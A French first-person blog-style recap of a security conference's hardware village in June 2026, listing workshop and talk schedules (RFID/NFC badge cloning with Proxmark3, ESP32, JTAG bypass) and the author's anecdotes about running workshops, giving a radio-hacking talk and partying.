+Des ateliers étaient programmés toute la journée  
+
+--------------------------------------------------------------------------------
+::::::: LeLAB TRACK 
+::::::: Village Hardware Salle C et D niveau S2
+::::::: 26/06/2026
+--------------------------------------------------------------------------------
+
+10:00 - 12:00 	Badge Hackropole + Atelier mesures (par team badge FCSC)
+		- Soudure de badges lumineux capacitifs
+		- Découverte des oscillos, 
+		  analyseur logique, décodage de protocoles.
+	
+12:00 - 13:00	NFC/RFID Lab (Moi)
+		- Proxmark3, clone de badges, attaques NFC (replay,clone,fuzz…)
+		- Cracker plusieurs cibles, à plusieurs niveaux.
+
+13:00 - 14:00 	Hacking de Tag ESL via esp32 (par 7h30th3r0n3)
+		- Comprendre le protocole
+		- Flasher l'esp32 pour interagir avec le tag
+		- Exploration des différentes fonctionnalités
+
+14:00 - 17:00	Ateliers en continu (par team badge FCSC)
+		- Toujours du badge et des mesures
+
+17:00 - 18:00 	 Workshop "Explorer les signaux avec le DigiLab" (par tixlegeek)
+		- Flipper Zero, détection de grandeurs, retours sensoriels…
+
+
+En même temps quelques talks Salle 3 niveau S3
+
+
+14:00 - 14h50	Talk "IoT Horror Stories" (par Skander Belabed)
+15:00 - 16:00 	Talk "ESP32 au-delà des limites" (par 7h30th3r0n3)
+16:00 - 17:00	Talk "Offensive AI on ESP32" (par x42en & Ben Mz)
+
+--------------------------------------------------------------------------------
+
+
+10H30 
+
+Sorti de la cave, y'avais déja beaucoup, BEAUCOUP de monde, les stands 
+habituels, Mozilla, OSINT-FR, Synacktiv, Quarkslab, YWH, les keufs, etc
+J'en profite pour croiser d'anciens élèves à moi et camarades, boire un, puis 
+deux, puis trois cafés, manger des bonbons au CBD éviter les keufs et la DGSI 
+et faire connaissance avec de nouvelles têtes.
+
+12H00
+
+C'est le moment  de mon atelier "Lecture et clonage de badges RFID", 
+j'ai préparé un petit sac de cibles (clairement pas assez) avec un peu de tout,
+des badges iTag, du 125KHz, de l'ISO 1444-a, du Mifare Classic 1K et 4K, du
+DesFire, et deux trois faux positifs (j'ai mis des cartes sans rien et des 
+jetons de casino RFID ISO 18000 qui marche pas sur le pm3) et une dixaines de 
+clone chinois du proxmark3 rev2. L'objectif était d'apprendre à compiler et 
+flasher le firmware d'iceman sur la machine et d'utiliser les fonctionalitées 
+de base. Evidemment, sur les dix copies, on as eu quelques soucis de faux
+contacts sur au moins 3, 70% de fiabilitée
+
+La majoritée des gens on pus utiliser le materiel, reflash le proxmark et lire 
+le petit sac de cibles que j'avais. J'ai passé les dernières minutes restantes 
+à expliquer un petit peu le fonctionnement RFID/NFC, les différents tiroirs et 
+leurs utilitées, l'utilisation des clés A et B, le tiroir 0  et l'UUID etc..
+
+Je manquais clairement de cibles et donc demandé au copain Tr1stus1er de me 
+filer un coup de mains pour le lendemain.
+
+13H00
+
+Rien de spécial l'après midi, déja j'ai un peu la dalle à force de bouger et 
+j'ai compris qu'on avais droit à des paniers bouffe entant que conférenciers,
+j'ai oublier de les prendre, Tuxlu m'a donc gentilment acheter un bout de 
+sandwich et une boisson. Je me suis ensuite encore balladé, discuté, rencontrer 
+du monde. 
+
+Tix faisais des tours de salon avec son joli chapeau, Dr4Sil est arrivé, Des 
+skids d'Oteria ce sont amusés à  émettre comme des crados sur un canal PMR en 
+mode station de nombres, 70mW dans la gueule on c'est donc amusés à les 
+localiser. Pas de chance pour eux, quand on est allé les confronter z'avais pas
+fini de tout ranger. Faut dire que leur setup était crade, émettais trop fort 
+et pas de bonne qualitée.
+
+Je suis pas aller voir de conférences le premier jour, pas eu l'occasion.
+
+Nous sommes restés avec BellY jusque pas trop tard le soir, 23h pour pouvoir rentrer.
+
+J+1 :: Ateliers, beuverie et présentations
+
+Ok deuxième jour un peu plus compliqué, j'ai un atelier à leLAB à 12H, un 
+workshop hardware le soir et surtout une présentation début d'aprèm.
+En plus de ça je dois, voir la présentation d'Oros, voir la présentation de 
+Biero et d'autres si possible. Surtout que ce soir, on reste juqu'à pas d'heure 
+pour le Wargame et comme d'habitude, mon workshop est programmé fin de soirée.
+
+On ce lève ver 7H30, parti à 8H00, on loupe encore un ou deux trains, et on 
+arrives vers 9H30-10H00  au salon.
+
+Cette fois moins de monde, les salles étaient un peu plus respirable et on ce 
+bousculais pas. Je croise Tr1stus et l'emène poser son bazar, une grosse caisse
+de badges, cartes, tickets, ce que tu veux..à peut près 13ans de récup RFID dans
+une boite.
+
+Les ateliers changent un petit peu,
+
+--------------------------------------------------------------------------------
+::::::: LeLAB Track 
+::::::: Village Hardware (Salle C & D niveau S2 + Salle 3 niveau S3)
+::::::: 27/06/2026
+--------------------------------------------------------------------------------
+
+10h00 - 12h00    Badge Hackropole + Atelier mesures (toujours eux)
+		 - Soudure de badges lumineux capacitifs
+  		 - Découverte / expérimentation autour des instruments de labo
+    		 (oscilloscope MSO, analyse logique, décodage de protocoles, 
+    		 génération de signaux, glitches, etc.)
+
+12h50 - 13h00   (créneau continu) Workshop NFC/RFID Lab (par Beemo)
+  		- Proxmark3, clone de badges, attaques NFC…
+
+13h00 - 14h00   Workshop Hacking de Tag ESL via ESP32 (par 7h30th3r0n3)
+  		- Protocole, flashage ESP32, exploration des fonctionnalités…
+
+14h00 - 17h00   Workshop Badge Hackropole + Atelier mesures
+  		- Badge + mesures en continu
+
+17h00 - 18h00   Workshop "Explorer les signaux avec le DigiLab" (par tixlegeek)
+ 		 - Flipper Zero, détection de grandeurs, retours sensoriels…
+
+18h00 - 18h50   Talk "Cyberpunk Guide to hardware hacking" (par tixlegeek)
+ 		- Un guide simple pour se lancer dans le hardware hacking
+
+18h00 - 20h00   Workshop "Le top 5 des vulnérabilités IoT" (par yggdrasil)
+ 		- Compromettre un firmware / altérer des données /
+ 		élever des privilèges avec peu de matos
+20h00 - 21h00   Workshop "Outil de bypass de protection JTAG" (par Croute)
+ 		- Casser une protection (RDP) et récupérer le firmware en 
+ 		reproduisant des attaques réelles
+
+
+TALKS  Salle 3 niveau S3:
+
+
+10h00 - 10h20	Talk "KeyProxy" 
+		(par Rémi GUILLON)
+		- Keylogger physique et open-source conçu pour la Red Team
+		
+10h30 - 10h50   Talk "Getting your first CVE with hardware hacking" 
+		(Yassine Damiri)	
+  		- Obtenir ton premier CVE avec du hardware hacking 
+  		
+11h00 - 11h50   Talk "De la PS Vita au Flipper Zero" 
+		(par Jeremie Amsellem)
+  		- Aventure du hacking de consoles jusqu’à la création d’outils
+  		de sécurité
+  		
+12h00 - 12h50   Talk "Bootstrapping Kindle research"
+		(par Tanguy Dubroca)
+  		- Un nouveau jailbreak Kindle développé pour répondre 
+  		à une question personnelle
+  		
+19h00 - 19h55   Talk "Offensive AI on ESP32"
+		(par x42en & Ben Mz)
+  		- Vandal : Wi‑Fi, Bluetooth, Sub‑GHz, BadUSB… (démos prévues)
+
+--------------------------------------------------------------------------------
+
+j'ai encore l'occasion de bouger dans le salon, voir les copains.
+
+12H00 - je fais l'atelier, pas tout seul cette fois, a deux c'est quand même
+beaucoup plus fluide et j'ai enfin l'occasion de souffler un peu. Toujours 
+pareil, les petit défauts des copies chinoises ce font ressentir et il fallu 
+bricoler sur place. Même déroulement, même résultat, plutot content.
+
+J'apprend que mon atelier hardware est programmé pour 21H00 et que ma 
+présentation est à 17H00 à l'amphithéatre Gaston Berger. Biero et L0Key font 
+leur présentation vers 15h50, non filmée et Oros fait sa présentation à 18H30
+
+L'aprèm j'en profite pour terminer mes slides, quelques coquilles à corriger et
+une ou deux slides à rajouter. Cette année je parle, comme à mon habitude, de 
+piratage radio, une petite introduction à ce qu'est techniquement la radio, le
+vocabulaire et les différents types d'attaques.
+
+15H50 
+
+Biero et L0key on décidé de pas filmer la présentation, et par flemme je vais 
+pas détaillé ce qui a été dis, z'aviez qu'à être là, mais en gros, c'est la
+mise sous les projecteurs d'un groupe crack/warez ControlsNothing dont X fait
+parti. Objectif simple, cracker des logiciels industriels et les méthodes de 
+protection par mot de passe des projets. La présentation expliquait les
+différents outils qu'on as eu l'occasion de reverse / crack et un petit 
+narratif du pourquoi du comment qu'X à fait ça. AkA: y'a un marché au vietnam
+qui revend des projets volé protégés par mot de passe, et pour baiser le 
+marché, X c'est mis en tête de publier ça gratos.
+
+L0key à présenter les deux trois outils qu'il à eu l'occasion de reverse et 
+cracker et Biero nous as fait un joli narratif sur le Warez vietnamien
+
+17H00
+
+Après la présentation de biero, viens celle de Virtu que je ne vais pas pouvoir
+voir car je doit me préparer. Je descend dans la succursalle et la régie ou on
+le colle le micro sur la bouche, la batterie au cul, on me tripote tout le long
+pour brancher tout ça et je doit attendre mon tour sans trop bouger.
+
+La présentation en elle est même plutôt courte, là ou d'habitude je prend mon 
+temps (45min-1H30 à SecSea2K24) j'ai du speed à 25 min max et j'ai quand même
+réussi à me faire engeuler.
+
+J'ai eu pas mal de question intéressantes, pas mal d'étranger qui en ont profité
+pour faire leurs pub de club radio amateur, un ops bizarre qui m'a parlé de
+drones.
+
+Je me suis évidemment fait alpagué par deux trois personnes à la fin,
+un militaire qui fait de la reconnaissance de signaux et qu'éssayait de 
+m'embriguader dans ses emerdes, les brhackeuses, et Oros que je vois pour la
+première fois en physique. ça présentation est un peu similaire mais porté sur
+la 2G avec sont tool et une démo pas piqué des hannetons ;)
+
+19H00
+
+La présentation d'Oros terminée je vais enfin pouvoir boire. J'en profite pour
+me faufiler et taxer un max de pintes, tel le ras que je pense être avant de
+devoir retourner faire un atelier.
+
+21H00
+
+Je suis un peu éclaté, fatigué, et j'ai pommé une partie de mon materiel,
+J'arrive dans une salle après avoir stipulé qu'on pouvais pas être plus de 3 
+groupes, et voilà 15-20 personnes qui ce ramènes....Des multimètres qui
+tombe en rade et un ou deux transfos de LINKSYS que je retrouve pas.
+
+J'ai eu la visite fortuite de Snorky et son conpère, venu me soutenir.
+L'atelier ce passe bien, et j'en profite pour proposer deux trois cibles en plus
+
+00H00
+
+Ayé j'ai tout fini, je vais pouvoir m'éclatax! Je recroise Oros et Fox qui 
+discutent. Je croise Matthieu, Mozzie, WaWa et on fini la soiré à discuter
+tous ensemble. Je fait des allez retours toute la nuit entre le WarGame et le 
+coin dehors pour papoter et voir ou en sont les gens du CTF (je participe pas,
+la concurrence ça pue du cul)
+
+J+2 :: Mal au crâne + rangement
+
+On est dimanche, Il est 7H30 et on est pas couchés, on as passé la soirée au 
+Wargame et à la buvette, on c'est bien amusés, on as bien discutés, on as joués 
+au babyfoot et au air-hockey avec les zombies restants.
+
+Je vous avouerais que là, j'ai envie d'une seule chose, une douche et dodo. 
+
+On prend donc la décision, après avoir tout rangé dans leLAB et mis les affaires 
+dans  le sac, de ce barrer. Fin de séance et il me manque encore 
+deux/trois multimètre. On arrives à en retrouver deux dans les affaires avec 
+Tcccorp [^1]. Le dernier à été retrouvé un peu plus tard, j'était déja parti, 
+et soigneusement gardé par Tcccorp jusqu'à notre prochaine rencontre.
+
+On pack tout et on c'en va, éclatés et pas encore désaoulé pour ma part.
+Le voyage m'a paru extrèmement long, et après moutle galères, nous sommes 
+arrivés dans le AirBnB pour prendre notre douche et s'écrouler comme des 
+merdes dans le lit pour un dodo bien mérité.
+                                                             .---.        
+                                                            /  .  \      
+                                                           |\_/|   |     
+                                                           |   |  /|     
+     .-----------------------------------------------------------' |     
+    /  .-.     _______               ______  _   _  _____          |     
+   |  /   \   |__   __||     __     |  ____|| \ | ||  __ \         |     
+   | |\_.  |     | |   |__  /__\    | |__   |  \| || |  | |        |     
+   |\|  | /|     | |   |  \| ___|   |  __|  | . ` || |  | |        |     
+   | `---' |     | |   |  ||        | |____ | |\  || |__| |        |     
+   |       |     |_|        \__/    |______||_| \_||_____/         |     
+   |       |                                                      /      
+   |       |-----------------------------------------------------'       
+   \       |                                                             
+    \     /                                                              
+     `---'                                                              
+
+NoTes
+
+Merci à Mozzie et WaWa que j'ai croisé et fusillé du regard, certain de les
+avoirs déja croisés quelque part ;)
+
+[^1] Pendant tout l'événement j'ai pas arrêter de pômmer des affaires, des 
+multimètres et des targets RFID, à un tel point que Tcccorp à commencer à 
+m'appeler petit poucet.
+
+-- EOF --
